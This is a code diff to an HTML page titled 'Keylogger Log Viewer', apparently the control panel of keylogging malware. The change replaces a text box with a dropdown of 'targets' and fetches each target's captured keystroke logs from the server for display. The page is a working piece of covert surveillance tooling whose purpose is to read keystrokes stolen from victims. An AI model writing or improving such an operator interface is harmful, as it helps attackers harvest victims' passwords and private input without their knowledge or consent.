@@ -9,30 +9,50 @@
     <h1>Keylogger Log Viewer</h1>
     <h2>Available Targets</h2>
     <ul id="targets-list"></ul>
+
     <h2>View Logs</h2>
-    <input type="text" id="target-name" placeholder="Enter target name">
+    <!-- Dropdown to select target -->
+    <select id="target-name">
+        <option value="">Select a target</option>
+    </select>
     <button onclick="getLogs()">Get Logs</button>
+
     <pre id="log-output"></pre>
 
     <script>
+        // Function to fetch the available targets and populate the dropdown
         async function getTargets() {
             const response = await fetch('/targets');
             const data = await response.json();
             const targetsList = document.getElementById("targets-list");
+            const targetSelect = document.getElementById("target-name");
+
+            // Empty the current dropdown options
+            targetSelect.innerHTML = '<option value="">Select a target</option>';
+
+            // Add each target as a new option in the dropdown
             data.targets.forEach(target => {
-                const li = document.createElement("li");
-                li.textContent = target;
-                targetsList.appendChild(li);
+                const option = document.createElement("option");
+                option.value = target;
+                option.textContent = target;
+                targetSelect.appendChild(option);
             });
         }
 
+        // Function to get logs for the selected target
         async function getLogs() {
             const targetName = document.getElementById("target-name").value;
+            if (!targetName) {
+                alert("Please select a target.");
+                return;
+            }
+
             const response = await fetch(`/logs/${targetName}`);
             const data = await response.json();
             document.getElementById("log-output").textContent = data.logs || "No logs found.";
         }
 
+        // Load the targets list when the page is loaded
         window.onload = getTargets;
     </script>
 </body>
